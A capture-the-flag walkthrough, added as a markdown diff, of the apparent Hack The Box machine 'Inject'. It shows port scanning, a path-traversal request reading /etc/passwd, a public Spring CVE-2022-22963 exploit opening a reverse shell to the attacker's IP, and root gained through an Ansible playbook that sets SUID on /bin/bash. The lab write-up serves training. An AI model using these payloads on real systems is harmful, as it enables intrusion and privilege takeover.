@@ -1,0 +1,324 @@
+
+# Table of Contents
+
+1.  [Enumeration](#orga83dbea)
+2.  [Information Ghatering](#orgc72fd11)
+    1.  [HTTP\\80](#orga4ab86e)
+3.  [Privilege Escaletion as Phil](#org2153a62)
+4.  [Privilage Escaletion as Root](#orgbc65ff9)
+
+
+
+<a id="orga83dbea"></a>
+
+# Enumeration
+
+Let's the work with a simple scan for check if the hosts is `up`.
+
+    nmap -sn 10.10.11.204
+    Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 15:56 EST
+    Nmap scan report for 10.10.11.204
+    Host is up (0.038s latency).
+    Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
+
+Nice the host is up, so now we can try other type of scan for find the `open ports`.
+
+    nmap -sC -sV 10.10.11.204
+    Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 15:57 EST
+    Nmap scan report for 10.10.11.204
+    Host is up (0.039s latency).
+    Not shown: 998 closed tcp ports (conn-refused)
+    PORT     STATE SERVICE     VERSION
+    22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
+    |   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
+    |_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
+    8080/tcp open  nagios-nsca Nagios NSCA
+    |_http-title: Home
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds
+
+We have found two ports:
+
+-   `22 ssh`
+-   `8080 http` => Nagios NSCA
+
+
+<a id="orgc72fd11"></a>
+
+# Information Ghatering
+
+
+<a id="orga4ab86e"></a>
+
+## HTTP\\80
+
+We found the 8080 open, now we need to get as much information as possible
+So let's try to run `Whatweb`.
+
+    whatweb 10.10.11.204:8080 -vv
+    http://10.10.11.204:8080/ [200]
+    Identifying: http://10.10.11.204:8080
+    HTTP-Status: 200
+    [["Bootstrap",
+      [{:regexp=>
+         ["<link rel=\"stylesheet\" type=\"text/css\" href=\"/webjars/bootstrap/css/bootstrap"],
+        :regexp_compiled=>/<link [^>]*bootstrap/,
+        :certainty=>100}]],
+     ["Content-Language", [{:string=>"en-US", :certainty=>100}]],
+     ["Country", [{:string=>"RESERVED", :module=>"ZZ", :certainty=>100}]],
+     ["Frame",
+      [{:regexp=>["<iframe "],
+        :regexp_compiled=>/<i?frame\s+/i,
+        :certainty=>100}]],
+     ["HTML5",
+      [{:regexp=>["<!DOCTYPE html>"],
+        :regexp_compiled=>/<!DOCTYPE html>/i,
+        :certainty=>100}]],
+     ["IP", [{:string=>"10.10.11.204", :certainty=>100}]],
+     ["Title", [{:name=>"page title", :string=>"Home", :certainty=>100}]],
+     ["YouTube",
+      [{:regexp=>["www."],
+        :regexp_compiled=>
+         /<iframe [^>]*src=['"]https?:\/\/(www\.)?youtube\.com\/embed\//,
+        :certainty=>100}]]]
+    
+    WhatWeb report for http://10.10.11.204:8080
+    Status    : 200 OK
+    Title     : Home
+    IP        : 10.10.11.204
+    Country   : RESERVED, ZZ
+    
+    Summary   : Bootstrap, Content-Language[en-US], Frame, HTML5, YouTube
+    
+    Detected Plugins:
+    [ Bootstrap ]
+            Bootstrap is an open source toolkit for developing with 
+            HTML, CSS, and JS. 
+    
+            {:certainty=>100}
+            Website     : https://getbootstrap.com/
+    
+    [ Content-Language ]
+            Detect the content-language setting from the HTTP header. 
+    
+            String       : en-US
+            {:certainty=>100, :string=>"en-US"}
+    
+    [ Frame ]
+            This plugin detects instances of frame and iframe HTML 
+            elements. 
+    
+            {:certainty=>100}
+    
+    [ HTML5 ]
+            HTML version 5, detected by the doctype declaration 
+    
+            {:certainty=>100}
+    
+    [ YouTube ]
+            Embedded YouTube video 
+    
+            {:certainty=>100}
+            Website     : http://youtube.com/
+    
+    HTTP Headers:
+            HTTP/1.1 200 
+            Content-Type: text/html;charset=UTF-8
+            Content-Language: en-US
+            Transfer-Encoding: chunked
+            Date: Sun, 17 Dec 2023 21:02:47 GMT
+            Connection: close 
+
+Nothing good, let's see with directories maybe we will have better luck.
+
+    feroxbuster -u http://10.10.11.204:8080 -x "php,js,bak,md,json" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+    
+     ___  ___  __   __     __      __         __   ___
+    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+    by Ben "epi" Risher 🤓                 ver: 2.10.1
+    ───────────────────────────┬──────────────────────
+     🎯  Target Url            │ http://10.10.11.204:8080
+     🚀  Threads               │ 50
+     📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+     👌  Status Codes          │ All Status Codes!
+     💥  Timeout (secs)        │ 7
+     🦡  User-Agent            │ feroxbuster/2.10.1
+     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+     🔎  Extract Links         │ true
+     💲  Extensions            │ [php, js, bak, md, json]
+     🏁  HTTP methods          │ [GET]
+     🔃  Recursion Depth       │ 4
+    ───────────────────────────┴──────────────────────
+     🏁  Press [ENTER] to use the Scan Management Menu™
+    ──────────────────────────────────────────────────
+    404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+    200      GET      112l      326w     5371c http://10.10.11.204:8080/blogs
+    200      GET       26l       48w      457c http://10.10.11.204:8080/css/test.css
+    200      GET      104l      194w     5654c http://10.10.11.204:8080/register
+    200      GET       54l      107w     1857c http://10.10.11.204:8080/upload
+    200      GET       22l       22w      262c http://10.10.11.204:8080/css/under.css
+    200      GET        7l     2006w   163873c http://10.10.11.204:8080/webjars/bootstrap/css/bootstrap.min.css
+    200      GET      166l      487w     6657c http://10.10.11.204:8080/
+    200      GET      155l      278w     3093c http://10.10.11.204:8080/css/blog.css
+    200      GET        7l     2006w   163873c http://10.10.11.204:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css
+    🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_11_204:8080-1702848192.state ...
+    [>-------------------] - 5s      2525/1245882 45m     found:9       errors:0      
+    [>-------------------] - 5s      2346/1245774 429/s   http://10.10.11.204:8080/   
+
+We have found an interesting path `/upload`, now let's check this call.
+
+    GET /show_image?img=../../../../../../../../etc/passwd HTTP/1.1
+    Host: 10.10.11.204:8080
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+Testing an LFI attempt, we quickly realize that we are going to GOAL.
+
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    <SNIP>
+
+Now our goal is to navigate the filesystem and look for interesting artifacts.
+While browsing we come across an interresing file found in `/var/www/WebApp/pom.xml`.
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+            <modelVersion>4.0.0</modelVersion>
+            <parent>
+                    <groupId>org.springframework.boot</groupId>
+                    <artifactId>spring-boot-starter-parent</artifactId>
+                    <version>2.6.5</version>
+                    <relativePath/> <!-- lookup parent from repository -->
+            </parent>
+            <groupId>com.example</groupId>
+            <artifactId>WebApp</artifactId>
+            <version>0.0.1-SNAPSHOT</version>
+            <name>WebApp</name>
+            <description>Demo project for Spring Boot</description>
+            <properties>
+                    <java.version>11</java.version>
+                    </properties>
+          <SNIP>
+
+This file contain freamwork name `Spring` and version `2.6.5`.
+
+Whit a simple search on goole we can find that <https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/tree/main>.
+A repository that provide a poc for exploit the application.
+Let's see if we are lucky.
+
+    python3 exploit.py -u http://10.10.11.204:8080
+    [+] Target http://10.10.11.204:8080
+    
+    [+] Checking if http://10.10.11.204:8080 is vulnerable to CVE-2022-22963...
+    
+    [+] http://10.10.11.204:8080 is vulnerable
+    
+    [/] Attempt to take a reverse shell? [y/n]y
+    listening on [any] 4444 ...
+    [$$] Attacker IP:  10.10.14.7
+    connect to [10.10.14.7] from (UNKNOWN) [10.10.11.204] 38096
+    bash: cannot set terminal process group (823): Inappropriate ioctl for device
+    bash: no job control in this shell
+    frank@inject:/$ id 
+    id 
+    uid=1000(frank) gid=1000(frank) groups=1000(frank)
+    frank@inject:/$ 
+
+We are load out as rank, Nice!
+
+
+<a id="org2153a62"></a>
+
+# Privilege Escaletion as Phil
+
+Once we get into the filesystem we can go sbito and look for artifacts in frank's folder.
+
+Randomly opening the .m2 folder we find an xml configuration file.
+we print the file and smile.
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+      <servers>
+        <server>
+          <id>Inject</id>
+          <username>phil</username>
+          <password><Redacted></password>
+          <privateKey>${user.home}/.ssh/id_dsa</privateKey>
+          <filePermissions>660</filePermissions>
+          <directoryPermissions>660</directoryPermissions>
+          <configuration></configuration>
+        </server>
+      </servers>
+      </settings>
+
+We are Phil!
+
+
+<a id="orgbc65ff9"></a>
+
+# Privilage Escaletion as Root
+
+Once in we upload and execute leanpeace.
+
+    ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+    /tmp/lp.sh                                                                                                                                                                                                           
+    /tmp/hsperfdata_frank/823
+    /opt/automation/tasks/playbook_1.yml
+    /var/log/ubuntu-advantage-timer.log
+    /var/log/syslog
+    /var/log/journal/85d739f40e3d4536ad871c536347b52b/user-1000.journal
+    /var/log/journal/85d739f40e3d4536ad871c536347b52b/user-1001.journal
+    /var/log/journal/85d739f40e3d4536ad871c536347b52b/system.journal
+    /var/log/kern.log
+    /var/log/auth.log
+    /home/phil/.gnupg/pubring.kbx
+    /home/phil/.gnupg/trustdb.gpg
+
+`/opt/automation/tasks/playbook_1.yml` is now as mission.
+
+This YAML file is an `Ansible playbook`, a document that defines a set of actions to be performed on a set of specified hosts. In this case, the playbook is configured to act on the host "localhost" and contains a single activity (tasks).
+
+The specific task is called "Checking webapp service" and uses Ansible's ansible.builtin.systemd module to manage the "webapp" service via systemd.
+
+With a quick search we find something even more interesting [POC](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/).
+
+If the target system runs automation tasks with Ansible Playbook as root and we have write permission of task files (tasks/), we can inject arbitrary commands in yaml file.
+For example, create a new file /opt/ansible/tasks/evil.yaml.
+
+Whit a little refactor 
+
+    - hosts: localhost
+      tasks:
+        - name: Change permissions of /bin/bash
+          ansible.builtin.shell: |
+            chmod +s /bin/bash	    
+
+Ad a few time&#x2026;
+
+    phil@inject:/opt/automation/tasks# id
+    uid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)
+
